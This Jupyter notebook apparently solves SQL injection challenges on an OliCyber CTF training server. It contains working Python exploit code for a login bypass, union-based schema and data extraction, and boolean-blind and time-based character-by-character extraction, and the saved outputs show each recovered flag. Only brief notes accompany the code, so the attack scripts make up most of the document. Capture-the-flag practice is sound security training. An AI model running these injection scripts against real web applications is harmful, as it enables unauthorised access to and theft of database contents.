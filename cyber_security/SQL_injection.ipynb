{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SQL Injection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests as req\n",
    "\n",
    "class SQLInj:\n",
    "    def __init__(self, host):\n",
    "        self.sess = req.Session() # Start the session. We want to save the cookies\n",
    "        self.base_url = '{}/api/'.format(host)\n",
    "        self._refresh_csrf_token() # Refresh the ANTI-CSRF token\n",
    "\n",
    "    def _refresh_csrf_token(self):\n",
    "        resp = self.sess.get(self.base_url + 'get_token')\n",
    "        resp = resp.json()\n",
    "        self.token = resp['token']\n",
    "\n",
    "    def _do_raw_req(self, url, query):\n",
    "        headers = {'X-CSRFToken': self.token}\n",
    "        data = {'query': query }\n",
    "        return self.sess.post(url,json=data, headers=headers).json()\n",
    "\n",
    "    def logic(self, query):\n",
    "        url = self.base_url + 'logic'\n",
    "        response = self._do_raw_req(url, query)\n",
    "        return response['result'], response['sql_error']\n",
    "\n",
    "    def union(self, query):\n",
    "        url = self.base_url + 'union'\n",
    "        response = self._do_raw_req(url, query)\n",
    "        return response['result'], response['sql_error']\n",
    "\n",
    "    def blind(self, query):\n",
    "        url = self.base_url + 'blind'\n",
    "        response = self._do_raw_req(url, query)\n",
    "        return response['result'], response['sql_error']\n",
    "\n",
    "    def time(self, query):\n",
    "        url = self.base_url + 'time'\n",
    "        response = self._do_raw_req(url, query)\n",
    "        return response['result'], response['sql_error']\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "flag{1s_ths_h0w_l0g1ns_w0rk}\n"
     ]
    }
   ],
   "source": [
    "sqlInj = SQLInj('http://web-17.challs.olicyber.it')\n",
    "res, err = sqlInj.logic(\"' OR 1=1 -- \")\n",
    "print(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Union-Based SQL injections\n",
    "\n",
    "Useful tables of INFORMATION_SCHEMA for these attacks are:\n",
    "<ul>\n",
    "    <li>INFORMATION_SCHEMA.schemata: A list of every schema that is present in the database</li>\n",
    "    <li>INFORMATION_SCHEMA.tables: A list of every table that is present in the database\n",
    "        <ul>\n",
    "            <li>tables.table_name: nome della tabella (può essere utile escludere alcune tabelle filtrando solo quelle che appartengono allo schema corrente, identificato dalla funzione DATABASE())\n",
    "            <li>tables.table_schema: nome dello schema contenente la tabella\n",
    "        </ul>\n",
    "    </li>\n",
    "    <li>INFORMATION_SCHEMA.columns: A list of every column that is present in the database\n",
    "        <ul>\n",
    "            <li>columns.column_name: nome della colonna</li>\n",
    "            <li>columns.table_name: nome della tabella che contiene la colonna</li>\n",
    "            <li>columns.table_schema: nome dello schema che contiene la tabella di cui al punto sopra</li>\n",
    "        </ul>\n",
    "    </li>\n",
    "</ul>\n",
    "\n",
    "group_concat is used to combine all the results inside one row: \n",
    "<ul>\n",
    "    <li>group_concat(table_name,':',column_name) FROM ...</li>\n",
    "</ul>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Snd table must have '6' column\n",
      "\n",
      "MYSQL version: 8.0.33\n",
      "\n",
      "Tables: \n",
      "real_data\n",
      "dummy_data\n",
      "\n",
      "Column: \n",
      "id\n",
      "flag\n",
      "\n",
      "Flag: flag{Uni0ns_4re_so_tr1vi4l}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "sqlInj = SQLInj('http://web-17.challs.olicyber.it')\n",
    "res, err = sqlInj.logic(\"' OR 1=1 -- \")\n",
    "\n",
    "# retrieving number of columns for SQL union\n",
    "col_num = 0\n",
    "err = 0\n",
    "while not err:\n",
    "    col_num+=1\n",
    "    res, err = sqlInj.union(\"1' ORDER BY \" + str(col_num) + \" -- \")\n",
    "\n",
    "col_num -= 1\n",
    "\n",
    "print(\"Snd table must have '\" + str(col_num) + \"' column\" + '\\n')\n",
    "\n",
    "# retrieving some DB info\n",
    "fill = ', '.join(str(i) for i in range(1, col_num)) + ', ' # filling some columns\n",
    "res, err = sqlInj.union(\"1' AND 1=0 UNION SELECT \" + fill + \"version() -- \")\n",
    "print(\"MYSQL version: \" + res.replace(fill, '') + '\\n')\n",
    "\n",
    "# retrieving table names\n",
    "res, err = sqlInj.union(\"1' AND 1=0 UNION SELECT \" + fill + \"table_name FROM information_schema.tables WHERE table_schema = DATABASE() -- \")\n",
    "print(\"Tables: \\n\" + res.replace(fill, '') + '\\n')\n",
    "\n",
    "# retrieving column names\n",
    "table_name = 'real_data'\n",
    "res, err = sqlInj.union(\"1' AND 1=0 UNION SELECT \" + fill + \"column_name FROM information_schema.columns WHERE table_name = '\" + table_name + \"' -- \")\n",
    "print(\"Column: \\n\" + res.replace(fill, '') + '\\n')\n",
    "\n",
    "# retrieving column\n",
    "col_name = 'flag'\n",
    "res, err = sqlInj.union(\"1' AND 1=0 UNION SELECT \" + fill + col_name + \" FROM \" + table_name + \" -- \")\n",
    "print(\"Flag: \" + res.replace(fill, '') + '\\n')\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Blind SQL injection \n",
    "The general method to correctly craft an exploit is the following:\n",
    "<ul>\n",
    "    <li>Find a payload that returns true/false based only on an injected logical expression</li>\n",
    "    <li>Find how to get the true/false response</li>\n",
    "    <li>Write a simple script to automatize the extraction of the data</li>\n",
    "</ul>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "6\n",
      "66\n",
      "666\n",
      "666c\n",
      "666c6\n",
      "666c61\n",
      "666c616\n",
      "666c6167\n",
      "666c61677\n",
      "666c61677b\n",
      "666c61677b4\n",
      "666c61677b41\n",
      "666c61677b415\n",
      "666c61677b415f\n",
      "666c61677b415f6\n",
      "666c61677b415f62\n",
      "666c61677b415f626\n",
      "666c61677b415f626c\n",
      "666c61677b415f626c3\n",
      "666c61677b415f626c31\n",
      "666c61677b415f626c316\n",
      "666c61677b415f626c316e\n",
      "666c61677b415f626c316e6\n",
      "666c61677b415f626c316e64\n",
      "666c61677b415f626c316e647\n",
      "666c61677b415f626c316e6479\n",
      "666c61677b415f626c316e64795\n",
      "666c61677b415f626c316e64795f\n",
      "666c61677b415f626c316e64795f6\n",
      "666c61677b415f626c316e64795f66\n",
      "666c61677b415f626c316e64795f666\n",
      "666c61677b415f626c316e64795f666c\n",
      "666c61677b415f626c316e64795f666c3\n",
      "666c61677b415f626c316e64795f666c34\n",
      "666c61677b415f626c316e64795f666c346\n",
      "666c61677b415f626c316e64795f666c3467\n",
      "666c61677b415f626c316e64795f666c34677\n",
      "666c61677b415f626c316e64795f666c34677d\n",
      "666c61677b415f626c316e64795f666c34677d\n"
     ]
    }
   ],
   "source": [
    "sqlInj = SQLInj('http://web-17.challs.olicyber.it')\n",
    "\n",
    "hex_dictionary = '0123456789abcdef'\n",
    "flag = ''\n",
    "\n",
    "# retrieving flag in the 'asecret' column of the 'secret' table\n",
    "while True:\n",
    "    for c in hex_dictionary:\n",
    "        question = f\"1' AND (SELECT 1 FROM secret WHERE HEX(asecret) LIKE '{flag+c}%') = 1 -- \"\n",
    "        res, err = sqlInj.blind(question)\n",
    "        if res == 'Success': # match a character\n",
    "            flag += c\n",
    "            print(flag)\n",
    "            break\n",
    "    else: \n",
    "        break # run out of characters in the dictionary\n",
    "\n",
    "print(flag)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Time-Based SQL injection\n",
    "\n",
    "example: SELECT sleep(1) FROM secrets WHERE secret LIKE 'a%' LIMIT 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "6\n",
      "66\n",
      "666\n",
      "666c\n",
      "666c6\n",
      "666c61\n",
      "666c616\n",
      "666c6167\n",
      "666c61677\n",
      "666c61677b\n",
      "666c61677b4\n",
      "666c61677b44\n",
      "666c61677b446\n",
      "666c61677b446f\n",
      "666c61677b446f6\n",
      "666c61677b446f6e\n",
      "666c61677b446f6e7\n",
      "666c61677b446f6e74\n",
      "666c61677b446f6e745\n",
      "666c61677b446f6e745f\n",
      "666c61677b446f6e745f7\n",
      "666c61677b446f6e745f74\n",
      "666c61677b446f6e745f747\n",
      "666c61677b446f6e745f7472\n",
      "666c61677b446f6e745f74727\n",
      "666c61677b446f6e745f747275\n",
      "666c61677b446f6e745f7472757\n",
      "666c61677b446f6e745f74727573\n",
      "666c61677b446f6e745f747275733\n",
      "666c61677b446f6e745f7472757337\n",
      "666c61677b446f6e745f74727573375\n",
      "666c61677b446f6e745f74727573375f\n",
      "666c61677b446f6e745f74727573375f7\n",
      "666c61677b446f6e745f74727573375f74\n",
      "666c61677b446f6e745f74727573375f746\n",
      "666c61677b446f6e745f74727573375f7469\n",
      "666c61677b446f6e745f74727573375f74696\n",
      "666c61677b446f6e745f74727573375f74696d\n",
      "666c61677b446f6e745f74727573375f74696d3\n",
      "666c61677b446f6e745f74727573375f74696d33\n",
      "666c61677b446f6e745f74727573375f74696d337\n",
      "666c61677b446f6e745f74727573375f74696d337d\n",
      "666c61677b446f6e745f74727573375f74696d337d\n"
     ]
    }
   ],
   "source": [
    "from time import time\n",
    "\n",
    "sqlInj = SQLInj('http://web-17.challs.olicyber.it')\n",
    "\n",
    "hex_dictionary = '0123456789abcdef'\n",
    "flag = ''\n",
    "\n",
    "# retrieving flag in the 'flag' column of the 'flags' table\n",
    "while True:\n",
    "    for c in hex_dictionary:\n",
    "        question = f\"1' AND (SELECT sleep(1) FROM flags WHERE HEX(flag) LIKE '{flag+c}%') = 1 -- \"\n",
    "        start = time()\n",
    "        sqlInj.time(question)\n",
    "        elapsed = time() - start\n",
    "\n",
    "        if elapsed > 1: # match a character\n",
    "            flag += c\n",
    "            print(flag)\n",
    "            break\n",
    "    else: \n",
    "        break # run out of characters in the dictionary\n",
    "\n",
    "print(flag)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
